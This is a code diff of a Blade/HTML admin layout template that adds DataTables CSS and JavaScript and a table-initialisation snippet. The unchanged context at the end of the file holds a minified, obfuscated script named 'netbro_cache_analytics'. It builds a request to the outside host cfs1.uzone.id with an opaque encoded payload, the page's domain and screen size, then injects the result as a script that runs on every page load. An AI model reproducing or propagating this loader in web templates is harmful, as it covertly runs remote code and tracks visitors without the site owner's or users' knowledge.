@@ -16,6 +16,7 @@
         <link rel="stylesheet" type="text/css" href="{{ asset('admin/bootstrap/theme/16/bootstrap.min.css') }}">
         <link rel="stylesheet" type="text/css" href="{{ asset('admin/selectbox/css/bootstrap-select.min.css') }}">
         <link rel="stylesheet" type="text/css" href="{{ asset('admin/jquery-ui/jquery-ui.min.css') }}">
+        <link rel="stylesheet" type="text/css" href="{{ asset('css/datatables/datatables.css') }}">
         
 
         <!-- CSS CUSTOM untuk login dengan lokasi yang berbeda -->
@@ -122,7 +123,13 @@
             
             }
         </script>
-	    <script type="text/javascript" src="{{ asset('admin/js/underscore-min.js') }}"></script>
+        <script type="text/javascript" src="{{ asset('admin/js/underscore-min.js') }}"></script>
+        <script type="text/javascript" src="{{ asset('js/datatables/datatables.min.js') }}"></script>
+        <script>
+            if (jQuery("#example1").length) {
+                jQuery('#example1').DataTable();
+            }
+        </script>
         <script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "cfs1.uzone.id/2fn7a2/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582CL4NjpNgssKtOlSq5cdRBVfKhcWXIpYtqQT01608vLcfvNOa6dbTu2dBVFYhyUuS6M%2b%2bVp%2boKxK4e3aMVMpoEEjTnLc9G%2fwjuz87%2fzn1JeuwyDvrDd0kRysnCvUYhbiNuGDodnWnKZ9ZzHlpUZHsXkMuQIxbfbenRUL48tjdR2xObGBHGfyu2iZlqCvuIx%2bWN5x0Jqa%2bawDd3dBPGqVI9yXZCKQYujflCiICG%2bz0ULYf3mpANLnbVZogDQGCe1RR3%2bFHTffP3pZUm3JfdzsW6FSFomxFNc2H2vcPiHSFcTKIF8fCfXyjD5Mp2uHcoH35F%2ftGNe3wq5anodt4T03M3LqjricPsyXnjxlqf7GZVarki5WG1hL2ExE0JQNN%2bGcflVmjOoV6aJ2k%2bWidwcbhKdmG70%2fXSaOP2p%2bvvvyZLhJXGA%2f0GIPmXvNuyqPmpnjQZzlolyUnwNRz9SJhk%2f0bTt2NLhqe9RhnpzVh2IHSK1V3asQEIhejuWyfJcvgjX0dZvn02XN1tPpiSOzMJ8YqyzzFOFmKppFXUTYiiM918DMIka4l3Guyx4VF8zpSN7FQ7E370TcGnHm" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script>
     </body>
 </html>
